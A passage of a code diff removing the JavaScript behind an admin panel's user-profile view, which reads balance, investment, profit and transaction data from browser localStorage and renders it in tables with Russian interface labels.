-                tbody.innerHTML = `<tr><td colspan="4" style="text-align: center; color: var(--danger);">Ошибка загрузки: ${err.message}</td></tr>`;
-            }
-        }
-
-        function openAdminUserProfile(email) {
-            document.getElementById('adminMainView').style.display = 'none';
-            document.getElementById('adminUserDetailView').style.display = 'block';
-            
-            document.getElementById('adminDetailEmail').innerText = `Профиль: ${email}`;
-
-            const localDataRaw = localStorage.getItem('apex_data_' + email);
-            let uData = { balance: 0, invested: 0, profit: 0, transactions: [] };
-            
-            if (localDataRaw) {
-                uData = JSON.parse(localDataRaw);
-            }
-
-            document.getElementById('adminDetailBalance').innerText = `$${uData.balance.toFixed(2)}`;
-            document.getElementById('adminDetailInvested').innerText = `$${uData.invested.toFixed(2)}`;
-            document.getElementById('adminDetailProfit').innerText = `$${uData.profit.toFixed(2)}`;
-
-            const tbody = document.getElementById('adminDetailTransactionsBody');
-            tbody.innerHTML = '';
-
-            if (uData.transactions.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted);">Нет транзакций</td></tr>`;
-            } else {
-                uData.transactions.forEach(tx => {
-                    const badgeClass = tx.type === 'DEPOSIT' ? 'badge-deposit' : 'badge-payout';
-                    const tr = document.createElement('tr');
-                    tr.innerHTML = `
-                        <td><span class="${badgeClass}">${tx.type}</span></td>
-                        <td>$${tx.amount}</td>
-                        <td>${tx.method}</td>
-                        <td>${tx.date}</td>
-                        <td style="color: var(--accent);">${tx.status}</td>
-                    `;
-                    tbody.appendChild(tr);
-                });
-            }
-        }
-
-        function closeAdminUserProfile() {
-            document.getElementById('adminUserDetailView').style.display = 'none';
-            document.getElementById('adminMainView').style.display = 'block';
         }
     </script>
 </body>
